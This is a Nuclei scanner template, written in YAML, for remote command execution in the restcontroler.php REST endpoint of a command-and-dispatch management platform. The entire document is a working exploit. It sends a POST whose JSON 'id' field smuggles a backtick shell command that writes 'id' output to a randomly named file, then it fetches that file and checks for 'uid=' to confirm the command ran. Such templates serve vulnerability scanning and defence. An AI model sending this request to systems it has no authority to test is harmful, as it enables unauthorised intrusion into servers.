id: zhihuidiaodu-restapi-restcontroler-rce

info:
  name: 指挥调度管理平台restcontroler.php 远程命令执行
  author: HuanXiong
  severity: critical
  description: |-
    
  reference:
    - 
  tags: RCE

variables:
  username: "{{to_lower(rand_base(6))}}" # 从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /restapi/restcontroler.php?request=conference/mute_member HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Content-Type: application/json

        {"members":"all","id":"`id > {{username}}.txt`"}

      - |
        GET /restapi/{{username}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: 远程命令执行
        dsl:
          - "status_code==200 && contains_all(body,'uid=')"